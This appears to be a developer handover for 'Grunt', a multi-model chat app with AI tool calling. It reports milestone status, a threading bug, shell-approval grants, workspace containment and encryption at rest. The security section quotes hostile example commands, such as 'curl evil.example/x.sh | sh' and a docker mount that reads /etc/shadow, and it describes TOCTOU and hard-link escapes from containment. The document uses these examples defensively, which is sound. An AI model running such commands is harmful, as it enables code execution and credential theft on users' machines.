# Grunt — handover

This replaces an earlier handover written when the project was two
milestones in ("there is no runnable app yet"). That is no longer true. This
version reflects the state at the end of Task 31, branch `feat/grunt-v1`,
HEAD around commit `eba8f61` plus this doc's own commit.

**Status:** 721 unit/integration tests pass, 9/9 Playwright e2e specs pass,
`npm run typecheck` and `npm run build` are clean. `README.md` has a
verified install → build → run → mock-provider walkthrough — follow that
first if you just want to see it work.

## What works today, milestone by milestone

The plan (`docs/superpowers/plans/2026-08-12-grunt-v1.md`) is 31 tasks
across 8 milestones. Honest status of each:

| Milestone | Tasks | Covers | Status |
| --- | --- | --- | --- |
| M0 | T1–6 | Workspace skeleton/CI, core types, the four ports (`ChatEngine`, `Store`, `ToolProvider`, `SecretStore`), path containment, message-tree operations, test fakes | Done |
| M1 | T7–10 | DB open/WAL/local-path guard, schema + migrations, repositories, `SecretStore` adapters | Done |
| M2 | T11–15 | Provider registry, message conversion, mock provider, AI-SDK `ChatEngine`, connections/models/profiles REST API | Done |
| M3 | T16–18 | `TurnRunner`, SSE stream registry, chats API + FTS5 search | Done — this is the milestone the earlier handover called "the first genuinely usable point," and it now is one |
| M4 | T19–20 | App shell/state/SSE client, `Thread`/`Message`/`Composer` | Done |
| M5 | T21 | Attachment storage + capability fallback (a vision-less model gets a degradation notice, not a silent drop) | Done, with known gaps below |
| M6 | T22–26 | Permission broker, filesystem tools, shell tool, MCP client, `ToolProvider` assembly + approval UI + Inspector | Done. This milestone got a dedicated adversarial security re-review that found real, working exploits (see Security posture below) — all closed or explicitly narrowed, not swept under a "TODO" |
| M7 | T27–28 | Compare fan-out + variant UI (tabs, Split view, Keep), usage/cost reporting | Done |
| M8 | T29–31 | Tauri desktop shell, packaging, e2e smoke + this handover | **T29 and T30 are not built at all.** T31 (this task) is done: one consolidated Playwright smoke test plus README/HANDOVER |

**Recently fixed, worth knowing about:** building T31's end-to-end test (the
first time two ordinary single-profile messages were ever sent back-to-back
against a live server in the same chat) surfaced a real bug — `Composer.tsx`
parented every new turn on the raw `chat.headMessageId`, which by design
stays pinned to the *previous* turn's user message rather than
auto-advancing to its assistant reply (advancing it is supposed to be an
explicit "Keep," but there is no Keep control for an ordinary single-profile
reply — only for compare turns). The second message in any chat was
therefore silently parented as a sibling of the first reply instead of a
child of it, which demoted that reply to a collapsed "1 other variant" chip
and hid it from the thread. Fixed by having `Thread.tsx` pass its
already-computed, extended-forward tail down to `Composer` explicitly. Covered
by a test in `Composer.test.tsx`. If you're reading old screenshots or
recordings from before this fix, multi-turn conversations in them will look
subtly wrong in exactly this way.

## What is NOT built

**Task 29 (Tauri v2 sidecar) and Task 30 (packaging) do not exist.** There is
no `desktop/` directory, no Rust code, no `Cargo.toml`, no `.msi`/`.AppImage`
build. `grunt serve --port 0 --announce` (the handshake T29 needs) was never
added to the CLI either. **Grunt today is `grunt serve` (or `npm run serve`)
plus a browser — say that plainly, don't imply a desktop app exists.**
`packages/web/src/App.tsx` is an ordinary web app; nothing about it assumes
or benefits from a native shell.

There is also no Settings UI of any kind — not just for MCP servers, but for
connections and profiles too. Every one of those is created directly against
the REST API today (`README.md`'s mock-provider walkthrough uses `curl`
because that's genuinely the only way).

## Security posture, stated without euphemism

**The shell tool (`run_command`) is unsandboxed by design.** It executes
whatever command string the model produces on the real OS with the real
user's privileges; there is no seccomp, no container, no restricted PATH.
The *only* control on it is the approval gate — every call needs a human
decision unless a grant already covers it — so the gate has to be right,
because it's the entire defense, not one layer of several.

**Grants are default-deny, per profile, with per-command approval.**
`packages/core/src/domain/permissions.ts`'s `PermissionBroker` is the single
place every tool call is checked; `packages/tools/src/provider.ts` is the
only path a tool call can reach it through. A `chat`-scope approval
("Allow for this chat") is **not** a blanket grant for the chat's remainder —
it's pinned to the *exact* command string that was approved (`commandExact`),
specifically because an early version that scoped it more loosely meant
approving `echo hi` implicitly authorised `curl evil.example/x.sh | sh` for
the rest of the chat.

**Workspace containment is enforced by `containPath`**
(`packages/core/src/domain/paths.ts`), the one function every filesystem
tool call goes through. Read its module comment before touching that code —
it states its own guarantee precisely: *"resolving this path string right
now, following every symlink, does it land inside the workspace?"* — a
statement about a path at a moment, not about the file a caller subsequently
opens. Two things defeat that in between, and a model with `run_command` can
reach both:

- **Hard links** are not a race and not detectable by `containPath` at all —
  a hard link *is* the file under a second name, so `realpath` on an
  in-workspace entry correctly resolves to itself even when it names an
  outside file. The mitigation lives at the call site, not here:
  `packages/tools/src/fs-tools.ts`'s `openVerified` refuses any opened
  handle reporting `nlink > 1`. That refusal is blunt (it also refuses
  legitimately hard-linked files) and accepted as such — a false refusal is
  recoverable, a false accept is not. It is also not complete: a filesystem
  that doesn't report link counts (some network mounts) silently passes.
- **TOCTOU** — a directory component gets swapped for a junction pointing
  outside the workspace between the containment check and the tool actually
  using the path. Not theoretical: an unprivileged racer reproduced it live
  against the shipped tools before the current mitigation — `read_file`
  leaked content on 126 of 7,143 attempts (1.76%), `list_dir` enumerated an
  outside directory on 877 of 45,576 (1.92%), and a separate, unthrottled run
  landed 184 `write_file` writes on an outside file. After the current
  `openVerified`/`readdirVerified` bracketing (identity checks *before and
  after* `containPath`, plus a second containment verdict once the file is
  actually bound), the same read/list racer measured **zero** leaks across
  48,280 and 37,329 attempts respectively — **narrowed, not closed.** (The
  `write_file` regression test in `fs-tools.test.ts` is weaker evidence than
  those two by design: it checks the outside file's state once at the end of
  a race window plus a non-vacuity floor, not a per-attempt leak count, so
  treat a pass there as "no corruption observed this run," not a percentage
  claim — see that test's own block comment, corrected in this same round of
  work, for why.) The stated residual, from `fs-tools.ts`'s own module
  comment: an attacker who can land four precisely-timed toggles is still
  not stopped, and directory listings (`list_dir`, and the glob side of
  `search_files`) hold no file handle at all — Node exposes no fd-based
  `readdir` — so a swap that lands and reverts entirely inside one `readdir`
  call is undetectable by construction, not just unlikely. Read `paths.ts`
  and `fs-tools.ts` directly for the exact bracketing and the exact residual;
  both are documented in-module rather than only here, and the in-module
  version is the one that will stay in sync with the code.

**Shell grant defaults — a controller ruling that the shipped UI does not
follow.** During the T22–24 security re-review, an `always`-scope shell
grant using `commandPrefix` (matching a command *and any arguments after
it*) was flagged as, for most real programs, equivalent to an arbitrary-code-
execution grant: `npm test --node-options=--require=/tmp/evil.js`, `git -c
core.pager=/tmp/evil.sh log`, `docker run -v /:/host alpine cat
/host/etc/shadow`. The ruling (`.superpowers/sdd/2026-08-12-grunt-v1/progress.md`):
*"shell grants DEFAULT TO EXACT COMMAND. `commandPrefix` remains available
but must be an explicit opt-in with a visible warning, never the default
offered by the UI."* The broker-level half of this is solid — a `chat`-scope
grant is hardcoded to `commandExact` server-side, no UI path can make it a
prefix grant. **The UI's "Always allow" button does not follow the ruling
for `always`-scope grants**: `ApprovalPrompt.tsx`'s `deriveAlwaysConstraint`
unconditionally builds `{ commandPrefix: request.args.command }` for a shell
request, with no separate exact-command option and no warning shown. This
reads like the ruling wasn't carried into the later UI task rather than a
knowing reversal of it — either way, it's a real, live gap. **Top follow-up
if you pick this back up:** make "Always allow" default to `commandExact`
for shell, and offer `commandPrefix` only as an explicit, visibly-labelled
second choice.

## Encryption at rest

Provider API keys and other secrets live in `secrets.json` next to the
database (`<dirname(dbPath)>/secrets.json`), AES-256-GCM encrypted, key
derived via scrypt. The passphrase itself is either `GRUNT_SECRETS_PASSPHRASE`
if you set it, or — the default — a random 256-bit value generated once and
persisted at `secrets.json.key`, right beside the ciphertext it unlocks
(mode `0600` on POSIX; a documented no-op on Windows, where the file ends up
world-readable-equivalent). Stated plainly, from `container.ts`'s own
comment: **this protects against casual disclosure and backup/copy leakage
where the key file gets left behind by accident — it is not a defense
against local filesystem access.** Anyone who can read the encrypted file
can read the key file sitting next to it and decrypt everything. No OS
keychain integration exists (`Windows cmdkey` can set a credential but the
OS won't hand the password back out via CLI, so a keychain-backed store
couldn't round-trip reliably; macOS/Linux keychains were never built either)
— the encrypted-file store is the only option, and it warns loudly about
this on startup.

## Known gaps

- **No attachment deletion or blob GC.** `packages/server/src/routes/attachments.ts`
  has upload/list/get/content-fetch routes and no `DELETE`.
  `packages/store-sqlite/src/blob-store.ts`'s `BlobStore` has `pathFor`/
  `put`/`get` and nothing to unlink a blob. Content-addressed dedupe means
  re-uploading the same file is free, but nothing ever reclaims one that's
  no longer referenced — blobs accumulate on disk forever.
- **`storagePath` (a raw filesystem path) is returned in `Attachment` API
  responses** — `POST /chats/:id/attachments` and `GET /attachments/:id`
  both echo it verbatim. Not exploitable on its own (containment still
  applies to anything that reads it back), but it's more filesystem detail
  than a client needs and should probably be stripped before it ships
  anywhere untrusted.
- **The web store's message map is never pruned per chat.** `Thread.tsx`'s
  own comment: *"`messages` in the store is a flat, cross-chat pool — every
  message loaded or streamed into this session, never scoped or evicted per
  chat."* Correct behaviour is achieved by scoping at the point of use
  (`chatMessages`, filtered by `chatId`, before any tree computation) rather
  than by the underlying store ever forgetting anything — so it's a
  memory-growth concern over a long session with many chats visited, not a
  correctness bug.
- **`list_dir` holds no verifiable handle.** Covered above under TOCTOU —
  repeating it here because it's the sharpest instance of "narrowed, not
  closed": Node has no fd-based `readdir`, so this one is structural, not a
  matter of writing a tighter check.
- **MCP settings are REST-only, with no UI** — full CRUD exists at
  `packages/server/src/routes/tools.ts` (`GET/POST/DELETE /mcp-servers`,
  `POST /mcp-servers/:id/refresh`), nothing in `packages/web/src` calls it.
  Same story as connections/profiles (see "What is NOT built" above) — this
  one's just also explicitly called out in the T25/26 report as a follow-up.
- **The Inspector polls every 4s rather than pushing.** Deliberate, per its
  own comment (`Inspector.tsx`): MCP health, grants, and the audit trail
  each change on a different, unrelated timeline with no existing push
  channel to piggyback on, unlike the thread itself (SSE-driven). A Revoke
  action removes its row optimistically so it doesn't *look* laggy, but the
  other two sections can be up to 4s stale.

## Deviations from the original spec

All deliberate, all recorded at the time in the plan's Global Constraints:

| Spec said | Built | Why |
| --- | --- | --- |
| pnpm | npm workspaces | pnpm wasn't installed on the build machine; installing global tooling overnight was declined |
| Node 26 | Node 24.16.0 | What was on the machine — not a rejection of 26 for any `node:sqlite`/FTS5 reason, just "neither pnpm nor Node 26 was installed" |
| FTS5 with a `LIKE` fallback | FTS5 only, no fallback | FTS5 was verified present on this build, so the fallback would have been dead code |
| `.sql` migration files | Inlined as TypeScript string constants | `tsc` only emits `.js`/`.d.ts` — a plain `.sql` file is never copied into `dist/`, so a built package would silently ship without its migrations. Inlining removes that packaging failure mode at the cost of losing standalone `.sql` syntax highlighting |
| — | `node:sqlite` imported via `createRequire`, not a static `import` | `node:sqlite` has no unprefixed alias, and the vite-node version vitest 2.x pins hardcodes its builtin-module allowlist without it — a plain `import` resolves to the bare specifier `"sqlite"` under vitest and fails. `createRequire` is a function call, not an import declaration, so it bypasses vite-node's static rewriting and hits Node's own loader, which resolves it correctly both under vitest and under plain `node`. Verified the built `dist/db.js` uses the identical call, so tests and the shipped server agree — this isn't a test-only shim. Revisit once vitest moves past whatever vite-node version fixes the allowlist |

## Where to look

| Document | What it is |
| --- | --- |
| `README.md` | Install, run, add a connection/profile, the mock-provider walkthrough |
| `docs/superpowers/specs/2026-08-12-grunt-multi-model-chat-workbench-design.md` | The original design spec — architecture, data model, permission model, error taxonomy |
| `docs/superpowers/plans/2026-08-12-grunt-v1.md` | The 31-task implementation plan this was built from, with the full milestone breakdown and code-level detail for M0–M3 |
| `.superpowers/sdd/2026-08-12-grunt-v1/progress.md` | The execution ledger — every review finding, ruling, and parked risk, including the exact racer numbers behind the TOCTOU claims above and the full shell-grant controller ruling. Git-ignored, so it only exists on a machine that built this |
| `packages/core/src/domain/paths.ts`, `packages/tools/src/fs-tools.ts` | The containment/TOCTOU/hard-link mechanics and their residuals, documented in-module — read these directly rather than trusting a paraphrase, this one included |

## If you're picking this back up

The natural next steps, roughly in order of value:
1. Fix the shell "Always allow" default (see Security posture above) — small, well-scoped, and the only place the shipped code visibly disagrees with a recorded security ruling.
2. Task 29/30 (Tauri shell + packaging) if a desktop app is still wanted, or drop them from the plan and call `grunt serve` + browser the intended shape.
3. A Settings UI for connections/profiles/MCP servers — everything currently requires hand-written `curl`, which is fine for evaluation and bad for real use.
4. Attachment deletion / blob GC, before blob storage in any long-running instance grows unboundedly.
